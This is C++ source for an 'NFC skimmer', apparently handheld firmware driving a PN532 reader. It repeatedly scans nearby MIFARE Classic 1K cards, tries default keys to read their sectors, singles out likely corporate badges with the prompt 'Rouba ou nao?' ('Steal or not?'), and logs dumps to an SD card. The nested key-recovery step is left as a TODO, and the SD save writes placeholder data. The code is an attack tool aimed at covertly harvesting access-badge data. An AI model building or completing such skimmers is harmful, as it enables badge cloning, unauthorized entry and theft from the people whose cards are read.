#include "nfc_skimmer.h"
#include "PN532.h"
#include "core/display.h"
#include "core/sd_functions.h"
#include <SPI.h>

// NFC Skimmer implementation
class NFCSkimmer {
private:
    PN532* pn532 = nullptr;
    int card_counter = 1;

    void init_pn532() {
        // Initialize PN532 with SPI pins: 5,18,19,23 (MOSI, MISO, SCK, SS)
        SPI.begin(18, 19, 23); // SCK, MISO, MOSI
        pn532 = new PN532(PN532::SPI);
        pn532->begin();
    }

    bool read_mifare_1k() {
        tft.println("Scanning for MIFARE 1K cards...");

        if (!pn532->nfc.startPassiveTargetIDDetection(PN532_MIFARE_ISO14443A)) {
            tft.println("No card detected");
            return false;
        }

        if (!pn532->readDetectedTarget()) {
            tft.println("Failed to read target");
            return false;
        }

        // Check if it's MIFARE 1K
        if (pn532->targetUid.sak != 0x08) {
            tft.println("Not MIFARE 1K (SAK: " + String(pn532->targetUid.sak, HEX) + ")");
            return false;
        }

        tft.println("MIFARE 1K detected!");
        tft.println("UID: " + pn532->printableUID.uid);

        // Check for corporate badge
        detect_corporate_badge();

        // Read sectors without key (try default keys first)
        if (!read_sectors_no_key()) {
            tft.println("Trying nested attack...");
            // TODO: Implement nested attack for key recovery
            tft.println("Nested attack not implemented yet");
            return false;
        }

        return true;
    }

    void detect_corporate_badge() {
        // Simple heuristic: check if UID starts with certain patterns
        String uid = pn532->printableUID.uid;
        uid.replace(" ", "");

        // Common corporate badge patterns (example)
        if (uid.startsWith("AABB") || uid.startsWith("CCDD") || uid.length() > 12) {
            tft.println("AVISO: Isso e badge corporativo!");
            tft.println("Rouba ou nao?");

            // Wait for user decision
            while (!check(AnyKeyPress)) {
                delay(100);
            }
        }
    }

    bool read_sectors_no_key() {
        // Try default keys
        uint8_t defaultKeyA[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        uint8_t defaultKeyB[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

        tft.println("Trying default keys...");

        // For MIFARE 1K, try to read all sectors
        for (int sector = 0; sector < 16; sector++) {
            int block = sector * 4;

            // Try Key A
            bool authA = pn532->nfc.mifareclassic_AuthenticateBlock(
                pn532->targetUid.uidByte, pn532->targetUid.size, block, 0, defaultKeyA);

            if (authA) {
                tft.println("Sector " + String(sector) + " authenticated with Key A");
                read_sector_data(sector);
            } else {
                // Try Key B
                bool authB = pn532->nfc.mifareclassic_AuthenticateBlock(
                    pn532->targetUid.uidByte, pn532->targetUid.size, block, 1, defaultKeyB);

                if (authB) {
                    tft.println("Sector " + String(sector) + " authenticated with Key B");
                    read_sector_data(sector);
                } else {
                    tft.println("Sector " + String(sector) + " authentication failed");
                    return false; // If any sector fails, stop
                }
            }
        }

        return true;
    }

    void read_sector_data(int sector) {
        uint8_t buffer[18];
        int block = sector * 4;

        for (int i = 0; i < 4; i++) { // 4 blocks per sector
            int currentBlock = block + i;

            if (pn532->nfc.mifareclassic_ReadDataBlock(currentBlock, buffer)) {
                // Store data (would save to SD here)
                tft.printf("Block %d: ", currentBlock);
                for (int j = 0; j < 16; j++) {
                    tft.printf("%02X ", buffer[j]);
                }
                tft.println();
            }
        }
    }

    void save_to_sd() {
        if (!setupSdCard()) {
            tft.println("SD card not available");
            return;
        }

        String uid = pn532->printableUID.uid;
        uid.replace(" ", "");
        uid.toLowerCase();

        String filename = "cartao_" + String(card_counter) + "_" + uid + ".dump";

        File file = SD.open("/" + filename, FILE_WRITE);
        if (file) {
            file.println("MIFARE 1K Dump");
            file.println("UID: " + pn532->printableUID.uid);
            file.println("SAK: " + pn532->printableUID.sak);
            file.println("ATQA: " + pn532->printableUID.atqa);
            file.println("--- Sector Data ---");

            // Would write actual sector data here
            file.println("Sector data would be saved here...");

            file.close();
            tft.println("Saved to: " + filename);
            card_counter++;
        } else {
            tft.println("Failed to save to SD");
        }
    }

public:
    void start_skimming() {
        tft.println("NFC Skimmer Active");
        tft.println("PN532 SPI pins: 5,18,19,23");

        init_pn532();

        tft.println("Press any key to stop skimming");

        while (!check(AnyKeyPress)) {
            if (read_mifare_1k()) {
                save_to_sd();
                tft.println("Card skimmed successfully!");
                delay(2000); // Wait before next scan
            }
            delay(500);
        }

        if (pn532) {
            delete pn532;
            pn532 = nullptr;
        }

        tft.println("Skimming stopped");
    }
};

// Global function for NFC Skimmer
void nfc_skimmer_attack() {
    NFCSkimmer skimmer;
    skimmer.start_skimming();
}
